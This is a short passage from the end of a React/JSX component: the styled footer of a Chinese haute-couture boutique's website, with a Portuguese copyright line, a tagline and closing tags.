          <p className="tracking-widest uppercase">© 2026 YING & CHEN BOUTIQUE. TODOS OS DIREITOS RESERVADOS.</p>
          <p className="font-mono text-[#cfab7c]/70 tracking-widest hidden xs:block">
            ALTA COSTURA CHINESA • EXCLUSIVE CUSTOMER GATEWAY
          </p>
        </div>
      </footer>

    </div>
  );
}
